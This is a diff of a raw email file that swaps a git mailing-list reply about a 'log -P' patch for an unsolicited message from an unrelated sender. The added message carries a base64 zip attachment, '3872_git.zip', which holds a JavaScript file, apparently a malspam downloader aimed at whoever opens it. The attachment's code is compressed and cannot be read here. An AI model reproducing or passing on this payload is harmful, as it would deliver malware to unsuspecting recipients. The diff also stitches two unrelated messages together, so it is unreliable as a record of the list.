@@ -1,92 +1,98 @@
 Return-Path: <git-owner@vger.kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on dcvr.yhbt.net
-X-Spam-Level: 
+X-Spam-Level: **
 X-Spam-ASN: AS31976 209.132.180.0/23
-X-Spam-Status: No, score=-3.4 required=3.0 tests=AWL,BAYES_00,DKIM_SIGNED,
-	HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_HI,RCVD_IN_SORBS_SPAM,
-	RP_MATCHES_RCVD,T_DKIM_INVALID shortcircuit=no autolearn=no
-	autolearn_force=no version=3.4.0
+X-Spam-Status: No, score=2.1 required=3.0 tests=BAYES_50,
+	HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_HI,RP_MATCHES_RCVD,ZIPFILE
+	shortcircuit=no autolearn=no autolearn_force=no version=3.4.0
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by dcvr.yhbt.net (Postfix) with ESMTP id EB5E31FAFB
-	for <e@80x24.org>; Mon, 10 Apr 2017 02:39:26 +0000 (UTC)
+	by dcvr.yhbt.net (Postfix) with ESMTP id 939FF1FAFB
+	for <e@80x24.org>; Mon, 10 Apr 2017 05:57:18 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1751350AbdDJCjY (ORCPT <rfc822;e@80x24.org>);
-        Sun, 9 Apr 2017 22:39:24 -0400
-Received: from mail-io0-f194.google.com ([209.85.223.194]:36644 "EHLO
-        mail-io0-f194.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751004AbdDJCjX (ORCPT <rfc822;git@vger.kernel.org>);
-        Sun, 9 Apr 2017 22:39:23 -0400
-Received: by mail-io0-f194.google.com with SMTP id 68so13287656ioh.3
-        for <git@vger.kernel.org>; Sun, 09 Apr 2017 19:39:23 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=mime-version:sender:in-reply-to:references:from:date:message-id
-         :subject:to:cc:content-transfer-encoding;
-        bh=tsVkv8jbDE9xhwmjN1zSk83V6ltZgFLCQP0oOfEoMOc=;
-        b=gAGIkYfc2oQu2uC8WK182hiuy3AQun1wrpJWgHfIcYm2fvdcXcxtXLfk3Tc7aBNPNG
-         fRQU4ebWhM4CU95QvQSGa4S/iZH3NwbB0vIMbZMu2cZcy6uOLHt2CKIFGNfVfyqBKgqz
-         BFvK9VnOEcoQf12zcpbg6wEpFxrUDr9Sh3vvMeGpUc4N2ldyRwokD1QAM8LGZHX8OJba
-         BSI7RolOP8o7jQ3eaALp2afIkugQo7nJVJ4G8BS2NFhf2SN2uvut68GpIEzrtKRijtxe
-         02/gV6BwfNDQ7UModoGL2T2sH5wuKUKpdMG0mF0c1Cc2RcoT8P1h8F5BNMw5SYibUVTr
-         xWng==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:sender:in-reply-to:references:from
-         :date:message-id:subject:to:cc:content-transfer-encoding;
-        bh=tsVkv8jbDE9xhwmjN1zSk83V6ltZgFLCQP0oOfEoMOc=;
-        b=SF1fBoeoaIW62imZLgwb7kPNkPDz9B5dCxzvQTRyluEzeBCcRa0AjQfs3/IxzMUD1d
-         gTB/wdRPVvzYtnzn+zPwPUD0Wz8X1oXWxnU6EU3LKjp2FpcJvAT4iyiF/HXaiNMB7vMf
-         YqRZOEyZHMpUf6g8oBQBYPnj2F3l4qPV2ENm+iTcJZyhyHnOiXOyoeSsHyedxUqAF2b2
-         GXdg4hQrOceN6mGNY2/Uu+2YHo3yOref+TDi5hY4OqdPaTshQ0Zuar6nDFZA87MFrpuQ
-         OHAtjBJNUOentefco4FLUxWJJgN+dw4Enb8KjA5NpNw9t72HLSzOSMcRKn0MVugU4e1e
-         VA/w==
-X-Gm-Message-State: AFeK/H2SqJcfNT1JM5cgeV6ZuwrXkEhATEbXtuzMQYlpRcU0j8CkM/fFxc4A7qsjITRBk4FOkx+VvFMbEoosOw==
-X-Received: by 10.107.163.83 with SMTP id m80mr51915042ioe.74.1491791962787;
- Sun, 09 Apr 2017 19:39:22 -0700 (PDT)
+        id S1751232AbdDJF5P (ORCPT <rfc822;e@80x24.org>);
+        Mon, 10 Apr 2017 01:57:15 -0400
+Received: from dsl-5-140-212-124.permonline.ru ([5.140.212.124]:35654 "HELO
+        permonline.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1750989AbdDJF5P (ORCPT <rfc822;git@vger.kernel.org>);
+        Mon, 10 Apr 2017 01:57:15 -0400
+X-Greylist: delayed 300 seconds by postgrey-1.27 at vger.kernel.org; Mon, 10 Apr 2017 01:57:14 EDT
+Content-Type: application/zip; name="3872_git.zip"
+Message-ID: <149180382983.21476.6632073913638848627@permonline.ru>
+Date:   Mon, 10 Apr 2017 05:57:09 -0000
 MIME-Version: 1.0
-Received: by 10.107.134.34 with HTTP; Sun, 9 Apr 2017 19:39:02 -0700 (PDT)
-In-Reply-To: <20170408132506.5415-7-avarab@gmail.com>
-References: <20170408132506.5415-1-avarab@gmail.com> <20170408132506.5415-7-avarab@gmail.com>
-From:   Junio C Hamano <gitster@pobox.com>
-Date:   Mon, 10 Apr 2017 11:39:02 +0900
-X-Google-Sender-Auth: TGGvPX3qIjHl5kIwE8k2EcKtFA4
-Message-ID: <CAPc5daV2mFs90AaKv9HnhPfwZ4_dyt5cFvb8ZJJQmXjto+0AbQ@mail.gmail.com>
-Subject: Re: [PATCH 06/12] log: add -P as a synonym for --perl-regexp
-To:     =?UTF-8?B?w4Z2YXIgQXJuZmrDtnLDsCBCamFybWFzb24=?= <avarab@gmail.com>
-Cc:     Git Mailing List <git@vger.kernel.org>, Jeff King <peff@peff.net>,
-        Jeffrey Walton <noloader@gmail.com>,
-        =?UTF-8?Q?Micha=C5=82_Kiedrowicz?= <michal.kiedrowicz@gmail.com>,
-        J Smith <dark.panda@gmail.com>,
-        Victor Leschuk <vleschuk@gmail.com>,
-        =?UTF-8?B?Tmd1eeG7hW4gVGjDoWkgTmfhu41jIER1eQ==?= 
-        <pclouds@gmail.com>
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: quoted-printable
+Content-Disposition: attachment
+Subject: 
+Content-Transfer-Encoding: base64
+Reply-To: <clubdivertiacoai@aspromanis.org>
+From:   <clubdivertiacoai@aspromanis.org>
+To:     <git@vger.kernel.org>
+Importance: High
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
 
-On Sat, Apr 8, 2017 at 10:25 PM, =C3=86var Arnfj=C3=B6r=C3=B0 Bjarmason
-<avarab@gmail.com> wrote:
-> Add a short -P option as a synonym for the longer --perl-regexp, for
-> consistency with the options the corresponding grep invocations
-> accept.
->
-> This was intentionally omitted in commit 727b6fc3ed ("log --grep:
-> accept --basic-regexp and --perl-regexp", 2012-10-03) for unspecified
-> future use.
->
-> Since nothing has come along in over 4 1/2 years that's wanted to use
-> it, it's more valuable to make it consistent with "grep" than to keep
-> it open for future use, and to avoid the confusion of -P meaning
-> different things for grep & log, as is the case with the -G option.
-
-I initially had a strong reaction to the above "4 1/2 years entitles us to
-do anything that might inconvenience future developers" reasoning, but
-as long as we already have -E for extended regexp usable, even if we
-will never be able to use -G for basic regexp, I am OK with giving -P for
-pcre to be consistent with "git grep". I'd be even supportive if others
-agree with this change.
-
-Thanks.
+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
+AQABAE4AAACxDQAAAAA=
